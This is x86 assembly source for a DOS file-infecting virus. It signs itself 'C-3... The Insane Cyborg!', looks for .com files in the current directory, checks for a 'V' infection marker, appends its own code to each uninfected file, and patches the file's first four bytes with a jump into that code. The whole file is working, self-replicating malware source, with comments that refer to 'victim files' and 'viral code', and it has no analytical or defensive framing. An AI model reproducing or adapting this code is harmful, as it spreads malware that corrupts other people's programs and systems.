.model tiny
.radix 16
.code
        org 100
dummy:
    db  0e9,03,00,'V'
    Int 20
start:
        call    get_offset

get_offset:
        pop     bp                    ; get the
        sub     bp,offset get_offset  ; delta offset
nop
        lea     si,[buffa_bytes+bp]   ; restore our
nop
    push    ax
    pop cx
        mov     di,100                ; first four
        movsw                         ; bytes
        movsw
nop

        lea     dx,[end_virus+bp]     ; set the
        mov     ah,1a                 ; DTA to eov
nop
        int     21

    mov     ah,09
nop
    lea     dx,[bp+offset VnAmE]    
    int     21
    mov     ah,0
nop
    int     16

        lea     dx,[find_files+bp]    ; matching "*.com"
nop
        mov     ah,4e                 ; find first
find_next:
        int     21
nop
        jc      reset_DTA

        lea     dx,[end_virus+1e+bp]
nop
        mov     ax,3d02               ; open it
        int     21

nop
        jc      get_more

        xchg    bx,ax

        mov     cx,4                  ; first four bytes
        mov     ah,3f                 ; read em
        lea     dx,[buffa_bytes+bp]   ; and put them in
        int     21                    ; our buffer

        cmp     byte ptr [buffa_bytes+bp+3],'V'   ; check if already
        jz      close_em                          ; infected

        mov     ax,4202                           ; goto EOF
        sub     cx,cx
        cwd
        int     21

        sub     ax,3
        mov     word ptr [bp+jump_bytes+1],ax     ; use our 'jmp' bytes

        mov     ah,40                             ; write our
        mov     cx,end_virus-start                ; viral code
        lea     dx,[bp+start]                     ; to victim file
        int     21

        mov     ax,4200                           ; goto SOF
        sub     cx,cx
        cwd
        int     21

        mov     ah,40                             ; write our
        mov     cx,4                              ; first four
        lea     dx,[bp+jump_bytes]                ; bytes over
        int     21                                ; the original

close_em:
        mov     ah,3e                             ; close file
        int     21

get_more:
        mov     ah,4f                             ; find next
        jmp     find_next

reset_DTA:
        mov     dx,80                             ; reset the DTA
        mov     ah,1a
        int     21

        mov     di,100                           ; and return
        push    di                               ; to the original
        ret                                      ; program


find_files      db      '*.com',0                ; victim files
jump_bytes      db      0e9,03,0,'V'              ; our 'jmp' bytes
VnAmE       db      10,'C-3... The Insane Cyborg!',0Dh,0Ah,'$'
buffa_bytes:    db      90,90,90,90
                ; the original first four bytes will be put here

end_virus:
end dummy
